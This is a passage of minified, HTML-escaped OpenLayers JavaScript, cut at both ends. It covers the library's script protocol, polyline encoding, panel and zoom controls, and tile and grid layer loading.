this.pendingRequests[a.id];a.parentNode&amp;&amp;a.parentNode.removeChild(a)},handleRead:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){b.callback&amp;&amp;(a.data?(a.features=this.parseFeatures(a.data),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,this.destroyRequest(a.priv),b.callback.call(b.scope,a))},parseFeatures:function(a){return this.format.read(a)}, abort:function(a){if(a)this.destroyRequest(a.priv);else for(var b in this.pendingRequests)this.destroyRequest(this.pendingRequests[b])},destroy:function(){this.abort();delete this.params;delete this.format;OpenLayers.Protocol.prototype.destroy.apply(this)},CLASS_NAME:"OpenLayers.Protocol.Script"});(function(){var a=OpenLayers.Protocol.Script,b=0;a.registry={};a.register=function(c){var d="c"+ ++b;a.registry[d]=function(){c.apply(this,arguments)};return d};a.unregister=function(b){delete a.registry[b]}})();OpenLayers.Format.EncodedPolyline=OpenLayers.Class(OpenLayers.Format,{geometryType:"linestring",initialize:function(a){OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b;if("linestring"==this.geometryType)b=OpenLayers.Geometry.LineString;else if("linearring"==this.geometryType)b=OpenLayers.Geometry.LinearRing;else if("multipoint"==this.geometryType)b=OpenLayers.Geometry.MultiPoint;else if("point"!=this.geometryType&amp;&amp;"polygon"!=this.geometryType)return null;a=this.decodeDeltas(a, 2);for(var c=a.length,d=[],e=0;e+1&lt;c;){var f=a[e++],g=a[e++];d.push(new OpenLayers.Geometry.Point(g,f))}return"point"==this.geometryType?new OpenLayers.Feature.Vector(d[0]):"polygon"==this.geometryType?new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])):new OpenLayers.Feature.Vector(new b(d))},decode:function(a,b,c){a=this.decodeDeltas(a,b,c||1E5);c=a.length;for(var d=[],e=0;e+(b-1)&lt;c;){for(var f=[],g=0;g&lt;b;++g)f.push(a[e++]);d.push(f)}return d}, write:function(a){a=(a.constructor==Array?a[0]:a).geometry;var b=a.CLASS_NAME.split(".")[2].toLowerCase();if("point"==b)a=Array(a);else if("linestring"==b||"linearring"==b||"multipoint"==b)a=a.components;else if("polygon"==b)a=a.components[0].components;else return null;for(var b=[],c=a.length,d=0;d&lt;c;++d){var e=a[d];b.push(e.y);b.push(e.x)}return this.encodeDeltas(b,2)},encode:function(a,b,c){c=c||1E5;for(var d=[],e=a.length,f=0;f&lt;e;++f)for(var g=a[f],h=0;h&lt;b;++h)d.push(g[h]);return this.encodeDeltas(d, b,c)},encodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;for(var f=a.length,g=0;g&lt;f;)for(d=0;d&lt;b;++d,++g){var h=a[g],k=h-e[d];e[d]=h;a[g]=k}return this.encodeFloats(a,c||1E5)},decodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;a=this.decodeFloats(a,c||1E5);c=a.length;for(var f=0;f&lt;c;)for(d=0;d&lt;b;++d,++f)e[d]+=a[f],a[f]=e[d];return a},encodeFloats:function(a,b){for(var c=b||1E5,d=a.length,e=0;e&lt;d;++e)a[e]=Math.round(a[e]*c);return this.encodeSignedIntegers(a)},decodeFloats:function(a, b){for(var c=b||1E5,d=this.decodeSignedIntegers(a),e=d.length,f=0;f&lt;e;++f)d[f]/=c;return d},encodeSignedIntegers:function(a){for(var b=a.length,c=0;c&lt;b;++c){var d=a[c],e=d&lt;&lt;1;0>d&amp;&amp;(e=~e);a[c]=e}return this.encodeUnsignedIntegers(a)},decodeSignedIntegers:function(a){a=this.decodeUnsignedIntegers(a);for(var b=a.length,c=0;c&lt;b;++c){var d=a[c];a[c]=d&amp;1?~(d>>1):d>>1}return a},encodeUnsignedIntegers:function(a){for(var b="",c=a.length,d=0;d&lt;c;++d)b+=this.encodeUnsignedInteger(a[d]);return b},decodeUnsignedIntegers:function(a){for(var b= [],c=0,d=0,e=a.length,f=0;f&lt;e;++f){var g=a.charCodeAt(f)-63,c=c|(g&amp;31)&lt;&lt;d;32>g?(b.push(c),d=c=0):d+=5}return b},encodeFloat:function(a,b){a=Math.round(a*(b||1E5));return this.encodeSignedInteger(a)},decodeFloat:function(a,b){return this.decodeSignedInteger(a)/(b||1E5)},encodeSignedInteger:function(a){var b=a&lt;&lt;1;0>a&amp;&amp;(b=~b);return this.encodeUnsignedInteger(b)},decodeSignedInteger:function(a){a=this.decodeUnsignedInteger(a);return a&amp;1?~(a>>1):a>>1},encodeUnsignedInteger:function(a){for(var b,c="";32&lt;= a;)b=(32|a&amp;31)+63,c+=String.fromCharCode(b),a>>=5;return c+=String.fromCharCode(a+63)},decodeUnsignedInteger:function(a){for(var b=0,c=0,d=a.length,e=0;e&lt;d;++e){var f=a.charCodeAt(e)-63,b=b|(f&amp;31)&lt;&lt;c;if(32>f)break;c+=5}return b},CLASS_NAME:"OpenLayers.Format.EncodedPolyline"});OpenLayers.Control.Panel=OpenLayers.Class(OpenLayers.Control,{controls:null,autoActivate:!0,defaultControl:null,saveState:!1,allowDepress:!1,activeState:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.controls=[];this.activeState={}},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments);for(var a,b=this.controls.length-1;0&lt;=b;b--)a=this.controls[b],a.events&amp;&amp; a.events.un({activate:this.iconOn,deactivate:this.iconOff}),a.panel_div=null;this.activeState=null},activate:function(){if(OpenLayers.Control.prototype.activate.apply(this,arguments)){for(var a,b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],(a===this.defaultControl||this.saveState&amp;&amp;this.activeState[a.id])&amp;&amp;a.activate();!0===this.saveState&amp;&amp;(this.defaultControl=null);this.redraw();return!0}return!1},deactivate:function(){if(OpenLayers.Control.prototype.deactivate.apply(this,arguments)){for(var a, b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],this.activeState[a.id]=a.deactivate();this.redraw();return!0}return!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)):this.map.events.register("buttonclick",this,this.onButtonClick);this.addControlsToMap(this.controls);return this.div},redraw:function(){for(var a=this.div.childNodes.length-1;0&lt;=a;a--)this.div.removeChild(this.div.childNodes[a]); this.div.innerHTML="";if(this.active)for(var a=0,b=this.controls.length;a&lt;b;a++)this.div.appendChild(this.controls[a].panel_div)},activateControl:function(a){if(!this.active)return!1;if(a.type==OpenLayers.Control.TYPE_BUTTON)a.trigger();else if(a.type==OpenLayers.Control.TYPE_TOGGLE)a.active?a.deactivate():a.activate();else if(this.allowDepress&amp;&amp;a.active)a.deactivate();else{for(var b,c=0,d=this.controls.length;c&lt;d;c++)b=this.controls[c],b==a||b.type!==OpenLayers.Control.TYPE_TOOL&amp;&amp;null!=b.type||b.deactivate(); a.activate()}},addControls:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.controls=this.controls.concat(a);for(var b=0,c=a.length;b&lt;c;b++){var d=a[b],e=this.createControlMarkup(d);OpenLayers.Element.addClass(e,d.displayClass+"ItemInactive");OpenLayers.Element.addClass(e,"olButton");""==d.title||e.title||(e.title=d.title);d.panel_div=e}this.map&amp;&amp;(this.addControlsToMap(a),this.redraw())},createControlMarkup:function(a){return document.createElement("div")},addControlsToMap:function(a){for(var b, c=0,d=a.length;c&lt;d;c++)b=a[c],!0===b.autoActivate?(b.autoActivate=!1,this.map.addControl(b),b.autoActivate=!0):(this.map.addControl(b),b.deactivate()),b.events.on({activate:this.iconOn,deactivate:this.iconOff})},iconOn:function(){var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Inactive\\b"),"$1Active")},iconOff:function(){var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Active\\b"),"$1Inactive")},onButtonClick:function(a){var b= this.controls;a=a.buttonElement;for(var c=b.length-1;0&lt;=c;--c)if(b[c].panel_div===a){this.activateControl(b[c]);break}},getControlsBy:function(a,b){var c="function"==typeof b.test;return OpenLayers.Array.filter(this.controls,function(d){return d[a]==b||c&amp;&amp;b.test(d[a])})},getControlsByName:function(a){return this.getControlsBy("name",a)},getControlsByClass:function(a){return this.getControlsBy("CLASS_NAME",a)},CLASS_NAME:"OpenLayers.Control.Panel"});OpenLayers.Control.Button=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_BUTTON,trigger:function(){},CLASS_NAME:"OpenLayers.Control.Button"});OpenLayers.Control.ZoomIn=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomIn()},CLASS_NAME:"OpenLayers.Control.ZoomIn"});OpenLayers.Control.ZoomOut=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomOut()},CLASS_NAME:"OpenLayers.Control.ZoomOut"});OpenLayers.Control.ZoomToMaxExtent=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&amp;&amp;this.map.zoomToMaxExtent()},CLASS_NAME:"OpenLayers.Control.ZoomToMaxExtent"});OpenLayers.Control.ZoomPanel=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.ZoomIn,new OpenLayers.Control.ZoomToMaxExtent,new OpenLayers.Control.ZoomOut])},CLASS_NAME:"OpenLayers.Control.ZoomPanel"});OpenLayers.Layer.HTTPRequest=OpenLayers.Class(OpenLayers.Layer,{URL_HASH_FACTOR:(Math.sqrt(5)-1)/2,url:null,params:null,reproject:!1,initialize:function(a,b,c,d){OpenLayers.Layer.prototype.initialize.apply(this,[a,d]);this.url=b;this.params||(this.params=OpenLayers.Util.extend({},c))},destroy:function(){this.params=this.url=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.HTTPRequest(this.name,this.url,this.params,this.getOptions())); return a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setUrl:function(a){this.url=a},mergeNewParams:function(a){this.params=OpenLayers.Util.extend(this.params,a);a=this.redraw();null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"params"});return a},redraw:function(a){return a?this.mergeNewParams({_olSalt:Math.random()}):OpenLayers.Layer.prototype.redraw.apply(this,[])},selectUrl:function(a,b){for(var c=1,d=0,e=a.length;d&lt;e;d++)c*=a.charCodeAt(d)*this.URL_HASH_FACTOR, c-=Math.floor(c);return b[Math.floor(c*b.length)]},getFullRequestString:function(a,b){var c=b||this.url,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c));var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);return OpenLayers.Util.urlAppend(c,e)},CLASS_NAME:"OpenLayers.Layer.HTTPRequest"});OpenLayers.Tile=OpenLayers.Class({events:null,eventListeners:null,id:null,layer:null,url:null,bounds:null,size:null,position:null,isLoading:!1,initialize:function(a,b,c,d,e,f){this.layer=a;this.position=b.clone();this.setBounds(c);this.url=d;e&amp;&amp;(this.size=e.clone());this.id=OpenLayers.Util.createUniqueID("Tile_");OpenLayers.Util.extend(this,f);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners)},unload:function(){this.isLoading&amp;&amp;(this.isLoading= !1,this.events.triggerEvent("unload"))},destroy:function(){this.position=this.size=this.bounds=this.layer=null;this.eventListeners&amp;&amp;this.events.un(this.eventListeners);this.events.destroy();this.events=this.eventListeners=null},draw:function(a){a||this.clear();var b=this.shouldDraw();b&amp;&amp;(!a&amp;&amp;!1===this.events.triggerEvent("beforedraw"))&amp;&amp;(b=null);return b},shouldDraw:function(){var a=!1,b=this.layer.maxExtent;if(b){var c=this.layer.map,c=c.baseLayer.wrapDateLine&amp;&amp;c.getMaxExtent();this.bounds.intersectsBounds(b, {inclusive:!1,worldBounds:c})&amp;&amp;(a=!0)}return a||this.layer.displayOutsideMaxExtent},setBounds:function(a){a=a.clone();if(this.layer.map.baseLayer.wrapDateLine){var b=this.layer.map.getMaxExtent(),c=this.layer.map.getResolution();a=a.wrapDateLine(b,{leftTolerance:c,rightTolerance:c})}this.bounds=a},moveTo:function(a,b,c){null==c&amp;&amp;(c=!0);this.setBounds(a);this.position=b.clone();c&amp;&amp;this.draw()},clear:function(a){},CLASS_NAME:"OpenLayers.Tile"});OpenLayers.Tile.Image=OpenLayers.Class(OpenLayers.Tile,{url:null,imgDiv:null,frame:null,imageReloadAttempts:null,layerAlphaHack:null,asyncRequestId:null,maxGetUrlLength:null,canvasContext:null,crossOriginKeyword:null,initialize:function(a,b,c,d,e,f){OpenLayers.Tile.prototype.initialize.apply(this,arguments);this.url=d;this.layerAlphaHack=this.layer.alpha&amp;&amp;OpenLayers.Util.alphaHack();if(null!=this.maxGetUrlLength||this.layer.gutter||this.layerAlphaHack)this.frame=document.createElement("div"),this.frame.style.position= "absolute",this.frame.style.overflow="hidden";null!=this.maxGetUrlLength&amp;&amp;OpenLayers.Util.extend(this,OpenLayers.Tile.Image.IFrame)},destroy:function(){this.imgDiv&amp;&amp;(this.clear(),this.frame=this.imgDiv=null);this.asyncRequestId=null;OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);a?(this.layer!=this.layer.map.baseLayer&amp;&amp;this.layer.reproject&amp;&amp;(this.bounds=this.getBoundsFromBaseLayer(this.position)),this.isLoading?this._loadEvent= "reload":(this.isLoading=!0,this._loadEvent="loadstart"),this.renderTile(),this.positionTile()):!1===a&amp;&amp;this.unload();return a},renderTile:function(){if(this.layer.async){var a=this.asyncRequestId=(this.asyncRequestId||0)+1;this.layer.getURLasync(this.bounds,function(b){a==this.asyncRequestId&amp;&amp;(this.url=b,this.initImage())},this)}else this.url=this.layer.getURL(this.bounds),this.initImage()},positionTile:function(){var a=this.getTile().style,b=this.frame?this.size:this.layer.getImageSize(this.bounds), c=1;this.layer instanceof OpenLayers.Layer.Grid&amp;&amp;(c=this.layer.getServerResolution()/this.layer.map.getResolution());a.left=this.position.x+"px";a.top=this.position.y+"px";a.width=Math.round(c*b.w)+"px";a.height=Math.round(c*b.h)+"px"},clear:function(){OpenLayers.Tile.prototype.clear.apply(this,arguments);var a=this.imgDiv;if(a){var b=this.getTile();b.parentNode===this.layer.div&amp;&amp;this.layer.div.removeChild(b);this.setImgSrc();!0===this.layerAlphaHack&amp;&amp;(a.style.filter="");OpenLayers.Element.removeClass(a, "olImageLoadError")}this.canvasContext=null},getImage:function(){if(!this.imgDiv){this.imgDiv=OpenLayers.Tile.Image.IMAGE.cloneNode(!1);var a=this.imgDiv.style;if(this.frame){var b=0,c=0;this.layer.gutter&amp;&amp;(b=100*(this.layer.gutter/this.layer.tileSize.w),c=100*(this.layer.gutter/this.layer.tileSize.h));a.left=-b+"%";a.top=-c+"%";a.width=2*b+100+"%";a.height=2*c+100+"%"}a.visibility="hidden";a.opacity=0;1>this.layer.opacity&amp;&amp;(a.filter="alpha(opacity="+100*this.layer.opacity+")");a.position="absolute"; this.layerAlphaHack&amp;&amp;(a.paddingTop=a.height,a.height="0",a.width="100%");this.frame&amp;&amp;this.frame.appendChild(this.imgDiv)}return this.imgDiv},setImage:function(a){this.imgDiv=a},initImage:function(){if(this.url||this.imgDiv){this.events.triggerEvent("beforeload");this.layer.div.appendChild(this.getTile());this.events.triggerEvent(this._loadEvent);var a=this.getImage(),b=a.getAttribute("src")||"";this.url&amp;&amp;OpenLayers.Util.isEquivalentUrl(b,this.url)?this._loadTimeout=window.setTimeout(OpenLayers.Function.bind(this.onImageLoad, this),0):(this.stopLoading(),this.crossOriginKeyword&amp;&amp;a.removeAttribute("crossorigin"),OpenLayers.Event.observe(a,"load",OpenLayers.Function.bind(this.onImageLoad,this)),OpenLayers.Event.observe(a,"error",OpenLayers.Function.bind(this.onImageError,this)),this.imageReloadAttempts=0,this.setImgSrc(this.url))}else this.isLoading=!1},setImgSrc:function(a){var b=this.imgDiv;a?(b.style.visibility="hidden",b.style.opacity=0,this.crossOriginKeyword&amp;&amp;("data:"!==a.substr(0,5)?b.setAttribute("crossorigin",this.crossOriginKeyword): b.removeAttribute("crossorigin")),b.src=a):(this.stopLoading(),this.imgDiv=null,b.parentNode&amp;&amp;b.parentNode.removeChild(b))},getTile:function(){return this.frame?this.frame:this.getImage()},createBackBuffer:function(){if(this.imgDiv&amp;&amp;!this.isLoading){var a;this.frame?(a=this.frame.cloneNode(!1),a.appendChild(this.imgDiv)):a=this.imgDiv;this.imgDiv=null;return a}},onImageLoad:function(){var a=this.imgDiv;this.stopLoading();a.style.visibility="inherit";a.style.opacity=this.layer.opacity;this.isLoading= !1;this.canvasContext=null;this.events.triggerEvent("loadend");!0===this.layerAlphaHack&amp;&amp;(a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+a.src+"', sizingMethod='scale')")},onImageError:function(){var a=this.imgDiv;null!=a.src&amp;&amp;(this.imageReloadAttempts++,this.imageReloadAttempts&lt;=OpenLayers.IMAGE_RELOAD_ATTEMPTS?this.setImgSrc(this.layer.getURL(this.bounds)):(OpenLayers.Element.addClass(a,"olImageLoadError"),a.onerror=errorImage(a),this.events.triggerEvent("loaderror"),this.onImageLoad()))},stopLoading:function(){OpenLayers.Event.stopObservingElement(this.imgDiv); window.clearTimeout(this._loadTimeout);delete this._loadTimeout},getCanvasContext:function(){if(OpenLayers.CANVAS_SUPPORTED&amp;&amp;this.imgDiv&amp;&amp;!this.isLoading){if(!this.canvasContext){var a=document.createElement("canvas");a.width=this.size.w;a.height=this.size.h;this.canvasContext=a.getContext("2d");this.canvasContext.drawImage(this.imgDiv,0,0)}return this.canvasContext}},CLASS_NAME:"OpenLayers.Tile.Image"}); OpenLayers.Tile.Image.IMAGE=function(){var a=new Image;a.className="olTileImage";a.galleryImg="no";return a}();OpenLayers.Layer.Grid=OpenLayers.Class(OpenLayers.Layer.HTTPRequest,{tileSize:null,tileOriginCorner:"bl",tileOrigin:null,tileOptions:null,tileClass:OpenLayers.Tile.Image,grid:null,singleTile:!1,ratio:1.5,buffer:0,transitionEffect:"resize",numLoadingTiles:0,serverResolutions:null,loading:!1,backBuffer:null,gridResolution:null,backBufferResolution:null,backBufferLonLat:null,backBufferTimerId:null,removeBackBufferDelay:null,className:null,gridLayout:null,rowSign:null,transitionendEvents:["transitionend", "webkitTransitionEnd","otransitionend","oTransitionEnd"],initialize:function(a,b,c,d){OpenLayers.Layer.HTTPRequest.prototype.initialize.apply(this,arguments);this.grid=[];this._removeBackBuffer=OpenLayers.Function.bind(this.removeBackBuffer,this);this.initProperties();this.rowSign="t"===this.tileOriginCorner.substr(0,1)?1:-1},initProperties:function(){void 0===this.options.removeBackBufferDelay&amp;&amp;(this.removeBackBufferDelay=this.singleTile?0:2500);void 0===this.options.className&amp;&amp;(this.className=this.singleTile? "olLayerGridSingleTile":"olLayerGrid")},setMap:function(a){OpenLayers.Layer.HTTPRequest.prototype.setMap.call(this,a);OpenLayers.Element.addClass(this.div,this.className)},removeMap:function(a){this.removeBackBuffer()},destroy:function(){this.removeBackBuffer();this.clearGrid();this.tileSize=this.grid=null;OpenLayers.Layer.HTTPRequest.prototype.destroy.apply(this,arguments)},clearGrid:function(){if(this.grid){for(var a=0,b=this.grid.length;a&lt;b;a++)for(var c=this.grid[a],d=0,e=c.length;d&lt;e;d++)this.destroyTile(c[d]); this.grid=[];this.gridLayout=this.gridResolution=null}},addOptions:function(a,b){var c=void 0!==a.singleTile&amp;&amp;a.singleTile!==this.singleTile;OpenLayers.Layer.HTTPRequest.prototype.addOptions.apply(this,arguments);this.map&amp;&amp;c&amp;&amp;(this.initProperties(),this.clearGrid(),this.tileSize=this.options.tileSize,this.setTileSize(),this.moveTo(null,!0))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Grid(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.HTTPRequest.prototype.clone.apply(this, [a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];a.gridResolution=null;a.backBuffer=null;a.backBufferTimerId=null;a.loading=!1;a.numLoadingTiles=0;return a},moveTo:function(a,b,c){OpenLayers.Layer.HTTPRequest.prototype.moveTo.apply(this,arguments);a=a||this.map.getExtent();if(null!=a){var d=!this.grid.length||b,e=this.getTilesBounds(),f=this.map.getResolution();this.getServerResolution(f);if(this.singleTile){if(d||!c&amp;&amp;!e.containsBounds(a))b&amp;&amp;"resize"!==this.transitionEffect&amp;&amp; this.removeBackBuffer(),b&amp;&amp;"resize"!==this.transitionEffect||this.applyBackBuffer(f),this.initSingleTile(a)}else(d=d||!e.intersectsBounds(a,{worldBounds:this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent()}))?(!b||"resize"!==this.transitionEffect&amp;&amp;this.gridResolution!==f||this.applyBackBuffer(f),this.initGriddedTiles(a)):this.moveGriddedTiles()}},getTileData:function(a){var b=null,c=a.lon,d=a.lat,e=this.grid.length;if(this.map&amp;&amp;e){var f=this.map.getResolution();a=this.tileSize.w;var g=this.tileSize.h, h=this.grid[0][0].bounds,k=h.left,h=h.top;if(c&lt;k&amp;&amp;this.map.baseLayer.wrapDateLine)var l=this.map.getMaxExtent().getWidth(),m=Math.ceil((k-c)/l),c=c+l*m;c=(c-k)/(f*a);d=(h-d)/(f*g);f=Math.floor(c);k=Math.floor(d);0&lt;=k&amp;&amp;k&lt;e&amp;&amp;(e=this.grid[k][f])&amp;&amp;(b={tile:e,i:Math.floor((c-f)*a),j:Math.floor((d-k)*g)})}return b},destroyTile:function(a){this.removeTileMonitoringHooks(a);a.destroy()},getServerResolution:function(a){var b=Number.POSITIVE_INFINITY;a=a||this.map.getResolution();if(this.serverResolutions&amp;&amp; -1===OpenLayers.Util.indexOf(this.serverResolutions,a)){var c,d,e,f;for(c=this.serverResolutions.length-1;0&lt;=c;c--){e=this.serverResolutions[c];d=Math.abs(e-a);if(d>b)break;b=d;f=e}a=f}return a},getServerZoom:function(){var a=this.getServerResolution();return this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,a):this.map.getZoomForResolution(a)+(this.zoomOffset||0)},applyBackBuffer:function(a){null!==this.backBufferTimerId&amp;&amp;this.removeBackBuffer();var b=this.backBuffer;if(!b){b= this.createBackBuffer();if(!b)return;a===this.gridResolution?this.div.insertBefore(b,this.div.firstChild):this.map.baseLayer.div.parentNode.insertBefore(b,this.map.baseLayer.div);this.backBuffer=b;var c=this.grid[0][0].bounds;this.backBufferLonLat={lon:c.left,lat:c.top};this.backBufferResolution=this.gridResolution}for(var c=this.backBufferResolution/a,d=b.childNodes,e,f=d.length-1;0&lt;=f;--f)e=d[f],e.style.top=(c*e._i*e._h|0)+"px",e.style.left=(c*e._j*e._w|0)+"px",e.style.width=Math.round(c*e._w)+ "px",e.style.height=Math.round(c*e._h)+"px";a=this.getViewPortPxFromLonLat(this.backBufferLonLat,a);c=this.map.layerContainerOriginPx.y;b.style.left=Math.round(a.x-this.map.layerContainerOriginPx.x)+"px";b.style.top=Math.round(a.y-c)+"px"},createBackBuffer:function(){var a;if(0&lt;this.grid.length){a=document.createElement("div");a.id=this.div.id+"_bb";a.className="olBackBuffer";a.style.position="absolute";var b=this.map;a.style.zIndex="resize"===this.transitionEffect?this.getZIndex()-1:b.Z_INDEX_BASE.BaseLayer- (b.getNumLayers()-b.getLayerIndex(this));for(var b=0,c=this.grid.length;b&lt;c;b++)for(var d=0,e=this.grid[b].length;d&lt;e;d++){var f=this.grid[b][d],g=this.grid[b][d].createBackBuffer();g&amp;&amp;(g._i=b,g._j=d,g._w=f.size.w,g._h=f.size.h,g.id=f.id+"_bb",a.appendChild(g))}}return a},removeBackBuffer:function(){if(this._transitionElement){for(var a=this.transitionendEvents.length-1;0&lt;=a;--a)OpenLayers.Event.stopObserving(this._transitionElement,this.transitionendEvents[a],this._removeBackBuffer);delete this._transitionElement}this.backBuffer&amp;&amp; (this.backBuffer.parentNode&amp;&amp;this.backBuffer.parentNode.removeChild(this.backBuffer),this.backBufferResolution=this.backBuffer=null,null!==this.backBufferTimerId&amp;&amp;(window.clearTimeout(this.backBufferTimerId),this.backBufferTimerId=null))},moveByPx:function(a,b){this.singleTile||this.moveGriddedTiles()},setTileSize:function(a){this.singleTile&amp;&amp;(a=this.map.getSize(),a.h=parseInt(a.h*this.ratio,10),a.w=parseInt(a.w*this.ratio,10));OpenLayers.Layer.HTTPRequest.prototype.setTileSize.apply(this,[a])},getTilesBounds:function(){var a= null,b=this.grid.length;if(b)var a=this.grid[b-1][0].bounds,b=this.grid[0].length*a.getWidth(),c=this.grid.length*a.getHeight(),a=new OpenLayers.Bounds(a.left,a.bottom,a.left+b,a.bottom+c);return a},initSingleTile:function(a){this.events.triggerEvent("retile");var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;b=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2);c=this.map.getLayerPxFromLonLat({lon:b.left,lat:b.top});this.grid.length||(this.grid[0]=[]);(a=this.grid[0][0])? a.moveTo(b,c):(a=this.addTile(b,c),this.addTileMonitoringHooks(a),a.draw(),this.grid[0][0]=a);this.removeExcessTiles(1,1);this.gridResolution=this.getServerResolution()},calculateGridLayout:function(a,b,c){var d=c*this.tileSize.w;c*=this.tileSize.h;var e=Math.floor((a.left-b.lon)/d)-this.buffer,f=this.rowSign;a=Math[~f?"floor":"ceil"](f*(b.lat-a.top+c)/c)-this.buffer*f;return{tilelon:d,tilelat:c,startcol:e,startrow:a}},getTileOrigin:function(){var a=this.tileOrigin;if(!a)var a=this.getMaxExtent(), b={tl:["left","top"],tr:["right","top"],bl:["left","bottom"],br:["right","bottom"]}[this.tileOriginCorner],a=new OpenLayers.LonLat(a[b[0]],a[b[1]]);return a},getTileBoundsForGridIndex:function(a,b){var c=this.getTileOrigin(),d=this.gridLayout,e=d.tilelon,f=d.tilelat,g=d.startcol,d=d.startrow,h=this.rowSign;return new OpenLayers.Bounds(c.lon+(g+b)*e,c.lat-(d+a*h)*f*h,c.lon+(g+b+1)*e,c.lat-(d+(a-1)*h)*f*h)},initGriddedTiles:function(a){this.events.triggerEvent("retile");var b=this.map.getSize(),c=this.getTileOrigin(), d=this.map.getResolution(),e=this.getServerResolution(),f=d/e,d=this.tileSize.w/f,f=this.tileSize.h/f,g=Math.ceil(b.h/f)+2*this.buffer+1,b=Math.ceil(b.w/d)+2*this.buffer+1;this.gridLayout=e=this.calculateGridLayout(a,c,e);var c=e.tilelon,h=e.tilelat,e=this.map.layerContainerOriginPx.x,k=this.map.layerContainerOriginPx.y,l=this.getTileBoundsForGridIndex(0,0),m=this.map.getViewPortPxFromLonLat(new OpenLayers.LonLat(l.left,l.top));m.x=Math.round(m.x)-e;m.y=Math.round(m.y)-k;var e=[],k=this.map.getCenter(), n=0;do{var p=this.grid[n];p||(p=[],this.grid.push(p));var q=0;do{var l=this.getTileBoundsForGridIndex(n,q),r=m.clone();r.x+=q*Math.round(d);r.y+=n*Math.round(f);var s=p[q];s?s.moveTo(l,r,!1):(s=this.addTile(l,r),this.addTileMonitoringHooks(s),p.push(s));r=l.getCenterLonLat();e.push({tile:s,distance:Math.pow(r.lon-k.lon,2)+Math.pow(r.lat-k.lat,2)});q+=1}while(l.right&lt;=a.right+c*this.buffer||q&lt;b);n+=1}while(l.bottom>=a.bottom-h*this.buffer||n&lt;g);this.removeExcessTiles(n,q);this.gridResolution=d=this.getServerResolution(); e.sort(function(a,b){return a.distance-b.distance});a=0;for(d=e.length;a&lt;d;++a)e[a].tile.draw()},getMaxExtent:function(){return this.maxExtent},addTile:function(a,b){var c=new this.tileClass(this,b,a,null,this.tileSize,this.tileOptions);this.events.triggerEvent("addtile",{tile:c});return c},addTileMonitoringHooks:function(a){a.onLoadStart=function(){!1===this.loading&amp;&amp;(this.loading=!0,this.events.triggerEvent("loadstart"));this.events.triggerEvent("tileloadstart",{tile:a});this.numLoadingTiles++; !this.singleTile&amp;&amp;(this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution)&amp;&amp;OpenLayers.Element.addClass(a.getTile(),"olTileReplacing")};a.onLoadEnd=function(b){this.numLoadingTiles--;b="unload"===b.type;this.events.triggerEvent("tileloaded",{tile:a,aborted:b});if(!this.singleTile&amp;&amp;!b&amp;&amp;this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution){var c=a.getTile();if("none"===OpenLayers.Element.getStyle(c,"display")){var d=document.getElementById(a.id+"_bb");d&amp;&amp;d.parentNode.removeChild(d)}OpenLayers.Element.removeClass(c, "olTileReplacing")}if(0===this.numLoadingTiles){if(this.backBuffer)if(0===this.backBuffer.childNodes.length)this.removeBackBuffer();else{this._transitionElement=b?this.div.lastChild:a.imgDiv;b=this.transitionendEvents;for(c=b.length-1;0&lt;=c;--c)OpenLayers.Event.observe(this._transitionElement,b[c],this._removeBackBuffer);this.backBufferTimerId=window.setTimeout(this._removeBackBuffer,this.removeBackBufferDelay)}this.loading=!1;this.events.triggerEvent("loadend")}};a.onLoadError=function(){this.events.triggerEvent("tileerror", 